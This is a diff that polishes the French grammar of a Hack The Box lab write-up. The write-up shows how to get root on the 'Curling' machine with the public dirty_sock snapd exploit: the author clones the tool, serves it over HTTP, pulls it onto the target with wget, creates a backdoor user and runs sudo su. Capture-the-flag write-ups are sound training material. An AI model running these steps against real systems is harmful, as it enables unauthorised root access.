@@ -1,14 +1,16 @@
 # Privesc Curling
 
-Bonsoir à tous, j'ai trouvé un moyen d'être root sur la machine Curling avec un moyen très simple et très efficace et rapidement.
-Il y'avais une possiblité d'être root grâce au programme dirty_sock, une vulnérabilité très récente sur les machines Ubuntu en général.
+Bonjour à tous,
 
-Comment faire pour être root sur la machine Curling ? C'est pas très compliqué regardez les explications ;)
+J'ai découvert un moyen d'être root sur une machine Curling, à travers une technique simple, efficace et rapide.
+Il est possible d'obtenir les permissions root via le programme dirty_sock; une vulnérabilité très récente, présente sur les machines Ubuntu.
+
+Voici les explications pour le root sur Curling. C'est très simple !
 
 Dirty Sock
 ----
 
-Vous devez simplement installé l'outil dirty_sock avec git, et ensuite de transférer le script sur la machine cible et d'éxecute le script.
+Vous devez simplement installer l'outil dirty_sock avec git, ensuite transférez le script sur la machine ciblée, et éxecutez le script.
 
     root@Computer:~/htb/writeup/Curling# git clone https://github.com/initstring/dirty_sock.git
     Clonage dans 'dirty_sock'...
@@ -19,12 +21,13 @@ Vous devez simplement installé l'outil dirty_sock avec git, et ensuite de trans
     Dépaquetage des objets: 100% (47/47), fait.
     Vérification de la connectivité... fait.
 
-Après avoir installé et cloner ça sur votre machine physique suffis maintenant de transférer le fichier Python sur la machine cible et d'éxecuter le script. Pour le transfert de fichier je vous conseille SimpleHTTPServer.
+Après avoir installé et cloné sur votre machine physique, il suffit de transférer le fichier python sur la machine ciblée, et éxecuter le script. Pour les transfert de fichier, je vous conseille SimpleHTTPServer.
 
     root@Computer:~/htb/writeup/Curling# python -m SimpleHTTPServer 9001
     Serving HTTP on 0.0.0.0 port 9001 ...
     
-Exécuter premièrement ça sur votre machine physique, et il faut être dans le dossier dirty_sock (important). Une fois la commande tapé il vous suffit d'utiliser la commande wget sur la machine cible et de télécharger les deux scripts.
+Exécutez ça sur votre machine; il faut être impérativement présent dans le dossier dirty_sock.
+Une fois la commande tapée, il vous suffit d'utiliser wget sur la machine ciblée, et de télécharger les deux scripts.
 
     floris@curling:/tmp$ wget http://10.10.15.173:9001/dirty_sockv1.py -O dirty_sockv1.py
     [..SNIP...]
@@ -44,12 +47,13 @@ Exécuter premièrement ça sur votre machine physique, et il faut être dans le
 
     floris@curling:/tmp$
     
-Le résultat sur votre machine physique, si nous regardons bien, le fichier a été bien transférer avec sans aucune erreur sur la machine physique.
+Le résultat sur votre machine physique, si nous regardons bien, a transférer le fichier correctement, sans aucune erreur.
 
     10.10.10.150 - - [30/Mar/2019 21:24:21] "GET /dirty_sockv1.py HTTP/1.1" 200 -
     10.10.10.150 - - [30/Mar/2019 21:24:39] "GET /dirty_sockv2.py HTTP/1.1" 200 -
     
-Voilà, ensuite vous devez simplement exécuter l'outil dirty_sockv2.py et d'attendre que le programme crée un utilisateur dirty_sock et de vous connectez ensuite avec la commande su.    
+Ensuite, vous devez simplement exécuter l'outil dirty_sock2.py, et attendre que le programme crée un utilisateur dirty_sock et vous connecter avec la commande su.
+    
 
     floris@curling:/tmp$ python3 dirty_sockv2.py 
 
@@ -80,18 +84,18 @@ Voilà, ensuite vous devez simplement exécuter l'outil dirty_sockv2.py et d'att
        password: dirty_sock
     ********************
 
-Vous devez tapé la commande sudo su pour vous connectez en tant que utilisateur (dirty_sock).
+Tapez la commande sudo su pour vous connecter en tant qu'utilisateur (dirty sock).
 
     floris@curling:/tmp$ su - dirty_sock
     Password: 
     dirty_sock@curling:~$
     
-Une fois que vous avez réussis a vous connectez en tant que dirty_sock vous devez simplement tapé la commande sudo su, et de remettre le mot de passe de l'utilisateur pour vous connectez en tant que root et avoir un accès root sur la machine cible.
+Une fois que vous êtes connecté en tant que dirty_sock, vous devez taper la commande sudo su, et mettre le mot de pass utilisateur pour vous connecter en tant que root, ainsi obtenir un accès root sur la machine.
 
     root@curling:/home/dirty_sock# sudo su
     [sudo] password for dirty_sock: 
     root@curling:/home/dirty_sock#
-
-Voilà nous sommes root avec succès.
+    
+Voilà, nous sommes root !
 
 [![forthebadge made-with-python](https://media1.giphy.com/media/4PSEQpvV5wUpnmpP1l/giphy.gif?cid=790b76115c9fd2056341686e77c521a2)]
